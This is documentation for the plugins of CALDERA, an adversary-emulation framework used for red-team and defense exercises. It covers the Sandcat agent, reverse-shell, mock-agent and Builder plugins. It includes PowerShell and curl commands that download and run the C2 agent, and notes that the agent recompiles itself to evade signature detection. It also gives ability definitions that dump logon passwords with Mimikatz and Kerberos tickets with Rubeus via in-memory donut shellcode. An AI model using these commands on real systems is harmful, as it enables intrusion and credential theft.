Plugin library
============

Here you'll get a run-down of all open-source plugins, all of which can be found in the plugins/ directory as separate 
GIT repositories. 

To enable a plugin, add it to the `default.yml` file in the `conf/` directory. Make sure your server is stopped when editing the `default.yml` file.

Plugins can also be enabled through the GUI. Go to *Advanced -> Configuration* and then click on the 'enable' button for the plugin you would like to enable.

## Sandcat (54ndc47)

The Sandcat plugin, otherwise known as 54ndc47, is the default agent that CALDERA ships with. 
54ndc47 is written in GoLang for cross-platform compatibility. 

54ndc47 agents require network connectivity to CALDERA at port 8888.

### Deploy 

To deploy 54ndc47, use one of the built-in delivery commands which allows you to run the agent on any operating system. 
Each of these commands downloads the compiled 54ndc47 executable from CALDERA and runs it immediately. Find
the commands on the Sandcat plugin tab.

Once the agent is running, it should show log messages when it beacons into CALDERA.

> If you have GoLang installed on the CALDERA server, each time you run one of the delivery commands above, 
the agent will re-compile itself dynamically and it will change it's source code so it gets a different file 
hash (MD5) and a random name that blends into the operating system. This will help bypass file-based signature detections.

### Options

When deploying a 54ndc47 agent, there are optional parameters you can use when you start the executable:

* **Server**: This is the location of CALDERA. The agent must have connectivity to this host/port. 
* **Group**: This is the group name that you would like the agent to join when it starts. The group does not have to exist. A default group of my_group will be used if none is passed in.
* **v**: Use `-v` to see verbose output from sandcat.  Otherwise, sandcat will run silently.

### Extensions
In order to keep the agent code lightweight, the default 54ndc47 agent binary ships with limited basic functionality.
Users can dynamically compile additional features, referred to as "gocat extensions". Each extension adds to the 
existing `gocat` module code to provide functionality such as peer-to-peer proxy implementations, additional
executors, and additional C2 contact protocols. 

To request particular gocat extensions, users can 
include the `gocat-extensions` HTTP header when asking the C2 to compile an agent. The header value
must be a comma-separated list of requested extensions. The server will include the extensions in
the binary if they exist and if their dependencies are met (i.e. if extension A requires a particular
Golang module that is not installed on the server, then extension A will not be included).

Below is an example powershell snippet to request the C2 server to include the `proxy_http` and `shells` 
extensions:
```
$url="http://192.168.137.1:8888/file/download"; # change server IP/port as needed
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows"); # specifying Windows build
$wc.Headers.add("file","sandcat.go"); # requesting sandcat binary
$wc.Headers.add("gocat-extensions","proxy_http,shells"); # requesting the extensions
$output="C:\Users\Public\sandcat.exe"; # specify destination filename
$wc.DownloadFile($url,$output); # download
```

The following features are included in the stock agent:
- `HTTP` C2 contact protocol
- `psh` powershell executor (Windows)
- `sh` shell executor (Linux/Mac)

Additional functionality can be found in the following gocat extensions:
- `gist` extension provides the Github gist C2 contact protocol.
- `shells` extension provides the `cmd` (Windows cmd), `osascript` (Mac Osascript), and 
`pwsh` (Windows powershell core) executors.
- `shellcode` extension provides the shellcode executors.
- `proxy_http` extension provides the `HTTP` peer-to-peer proxy receiver.
- `proxy_smb_pipe` extension provides the `SmbPipe` peer-to-peer proxy client and receiver for Windows (peer-to-peer
communication via SMB named pipes).
- `donut` extension provides the Donut functionality to execute various assemblies in memory. 
See https://github.com/TheWover/donut for additional information.
- `shared` extension provides the C sharing functionality for 54ndc47.

#### Customizing Default Options & Execution Without CLI Options

It's possible to customize the default values of these options when pulling Sandcat from the CALDERA server.  
This is useful if you want to hide the parameters from the process tree. You can do this by passing the values
in as headers instead of as parameters.

For example, the following will download a linux executable that will use `http://10.0.0.2:8888` as the server address 
instead of `http://localhost:8888`.

```
curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' -H 'server:http://10.0.0.2:8888' http://localhost:8888/file/download > sandcat.sh
```

## Mock 

The Mock plugin adds a set of simulated agents to CALDERA and allows you to run complete operations without hooking any other computers up to your server. 

These agents are created inside the `conf/agents.yml` file. They can be edited and you can create as many as you'd like. A sample agent looks like:
```
- paw: 1234
  username: darthvader
  host: deathstar
  group: simulation
  platform: windows
  location: C:\Users\Public
  enabled: True
  privilege: User
  c2: HTTP
  exe_name: sandcat.exe
  executors:
    - pwsh
    - psh
```

After you load the mock plugin and restart CALDERA, all simulated agents will appear as normal agents in the Chain plugin GUI and can be used in any operation.

## Manx

The terminal plugin adds reverse-shell capability to CALDERA, along with a TCP-based agent called Manx.

When this plugin is loaded, you'll get access to a new GUI page which allows you to drop reverse-shells on target hosts 
and interact manually with the hosts. 

You can use the terminal emulator on the Terminal GUI page to interact with your sessions. 

## Stockpile

The stockpile plugin adds a few components to CALDERA:

* Abilities
* Adversaries
* Planner
* Facts

These components are all loaded through the `plugins/stockpile/data/*` directory.

## Response

The response plugin is an autonomous incident response plugin, which can fight back against adversaries
on a compromised host.

Similar to the stockpile plugin, it contains adversaries, abilties, and facts intended for incident response. These components are all loaded through the `plugins/response/data/*` directory.

## Compass

Create visualizations to explore TTPs. Follow the steps below to create your own visualization:

1. Click 'Generate Layer'
1. Click '+' to open a new tab in the navigator
1. Select 'Open Existing Layer'
1. Select 'Upload from local' and upload the generated layer file

Compass leverages ATT&CK Navigator, for more information see: [https://github.com/mitre-attack/attack-navigator](https://github.com/mitre-attack/attack-navigator)

## Caltack

The caltack plugin adds the public MITRE ATT&CK website to CALDERA. This is useful for deployments of CALDERA where an operator cannot access the Internet to reference the MITRE ATT&CK matrix.

After loading this plugin and restarting, the ATT&CK website is available from the CALDERA home page. Not all parts of the ATT&CK website will be available - but we aim to keep those pertaining to tactics and techniques accessible.

## SSL

The SSL plugin adds HTTPS to CALDERA. 
> This plugin only works if CALDERA is running on a Linux or MacOS machine. It requires HaProxy (>= 1.8) to be installed prior to using it.

When this plugin has been loaded, CALDERA will start the HAProxy service on the machine and then serve CALDERA at hxxps://[YOUR_IP]:8443, instead of the normal hxxp://[YOUR_IP]:8888.

CALDERA will **only** be available at https://[YOUR_IP]:8443 when using this plugin. All deployed agents should use the correct address to connect to CALDERA. 

## Atomic

The Atomic plugin imports all Red Canary Atomic tests from their open-source GitHub repository.

## GameBoard

The GameBoard plugin allows you to monitor both red-and-blue team operations. The game tracks points for both sides
and determines which one is "winning". 

To begin a gameboard exercise, first log in as blue user and deploy an agent. The 'Auto-Collect' operation will execute automatically. Alternatively, you can begin a different operation with the blue agent if you desire. Log in as red user and begin another operation. Open up the gameboard plugin from the GUI and select these new respective red and blue operations to monitor points for each operation. 

## Human

The Human plugin allows you to build "Humans" that will perform user actions on a target system as a means to obfuscate 
red actions by Caldera. Each human is built for a specific operating system and leverages the Chrome browser along with other native 
OS applications to perform a variety of tasks.  Additionally, these humans can have various aspects of their behavior "tuned"
to add randomization to the behaviors on the target system.

## Training

This plugin allows a user to gain a "User Certificate" which proves their ability to use CALDERA. This is the first of several certificates planned in the future. The plugin takes you through a capture-the-flag style certification course, covering all parts CALDERA.

## Access

This plugin allows you to task any agent with any ability from the database. It also allows you to conduct initial access attacks.

## Builder

The Builder plugin enables CALDERA to dynamically compile code segments into payloads that can be executed as abilities by implants.

Currently, only C# is supported. Code is compiled in a Docker container using Mono. The resulting executable, along with any additional references, will be copied to the remote machine and executed.

### Basic Example

The following "Hello World" ability can be used as a template for C# ability development:

```yaml
---

- id: 096a4e60-e761-4c16-891a-3dc4eff02e74
  name: Test C# Hello World
  description: Dynamically compile HelloWorld.exe
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      psh,cmd:
        build_target: HelloWorld.exe
        language: csharp
        code: |
          using System;

          namespace HelloWorld
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      Console.WriteLine("Hello World!");
                  }
              }
          }
```

### Advanced Examples

#### Arguments

It is possible to call dynamically-compiled executables with command line arguments by setting the ability `command` value. This allows for the passing of facts into the ability. The following example demonstrates this:

```yaml
---

- id: ac6106b3-4a45-4b5f-bebf-0bef13ba7c81
  name: Test C# Code with Arguments
  description: Hello Name
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      psh,cmd:
        build_target: HelloName.exe
        command: .\HelloName.exe "#{paw}"
        language: csharp
        code: |
          using System;

          namespace HelloWorld
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      if (args.Length == 0) {
                          Console.WriteLine("No name provided");
                      }
                      else {
                        Console.WriteLine("Hello " + Convert.ToString(args[0]));
                      }
                  }
              }
          }
```

#### DLL Dependencies

DLL dependencies can be added, at both compilation and execution times, using the ability `payload` field. The referenced library should be in a plugin's `payloads` folder, the same as any other payload.

The following ability references `SharpSploit.dll` and dumps logon passwords using Mimikatz:

```yaml
---

- id: 16bc2258-3b67-46c1-afb3-5269b6171c7e
  name: SharpSploit Mimikatz (DLL Dependency)
  description: SharpSploit Mimikatz
  tactic: credential-access
  technique:
    attack_id: T1003
    name: Credential Dumping
  privilege: Elevated
  platforms:
    windows:
      psh,cmd:
        build_target: CredDump.exe
        language: csharp
        code: |
          using System;
          using System.IO;
          using SharpSploit;

          namespace CredDump
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      SharpSploit.Credentials.Mimikatz mimi = new SharpSploit.Credentials.Mimikatz();
                      string logonPasswords = SharpSploit.Credentials.Mimikatz.LogonPasswords();
                      Console.WriteLine(logonPasswords);
                  }
              }
          }
        parsers:
          plugins.stockpile.app.parsers.katz:
            - source: domain.user.name
              edge: has_password
              target: domain.user.password
            - source: domain.user.name
              edge: has_hash
              target: domain.user.ntlm
            - source: domain.user.name
              edge: has_hash
              target: domain.user.sha1
  payloads:
    - SharpSploit.dll
```

#### Donut

The `donut` gocat extension is required to execute donut shellcode.

The `donut_amd` executor combined with a `build_target` value ending with `.donut`, can be used to generate shellcode using [donut](https://github.com/TheWover/donut). Payloads will first be dynamically-compiled into .NET executables using Builder, then converted to donut shellcode by a Stockpile payload handler. The `.donut` file will be written to disk and injected into memory by the sandcat agent.

The `command` field can, optionally, be used to supply command line arguments to the payload. In order for the sandcat agent to properly execute the payload, the `command` field must either begin with the `.donut` file name, or not exist.

The following example shows donut functionality using the optional `command` field to pass arguments:

```yaml
---

- id: 7edeece0-9a0e-4fdc-a93d-86fe2ff8ad55
  name: Test Donut with Arguments
  description: Hello Name Donut
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      donut_amd64:
        build_target: HelloNameDonut.donut
        command: .\HelloNameDonut.donut "#{paw}" "#{server}"
        language: csharp
        code: |
          using System;

          namespace HelloNameDonut
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      if (args.Length < 2) {
                          Console.WriteLine("No name, no server");
                      }
                      else {
                        Console.WriteLine("Hello " + Convert.ToString(args[0]) + " from " + Convert.ToString(args[1]));
                      }
                  }
              }
          }
```

Donut can also be used to read from an already-compiled executable with a `.donut.exe` extension. The following example will transform a payload named `Rubeus.donut.exe` into shellcode which will be executed in memory. Note that `Rubeus.donut` is specified:

```yaml
---

- id: 043d6200-0541-41ee-bc7f-bcc6ba15facd
  name: TGT Dump
  description: Dump TGT tickets with Rubeus
  tactic: credential-access
  technique:
    attack_id: T1558
    name: Steal or Forge Kerberos Tickets
  privilege: Elevated
  platforms:
    windows:
      donut_amd64:
        command: .\Rubeus.donut dump /nowrap
        payloads:
        - Rubeus.donut
```
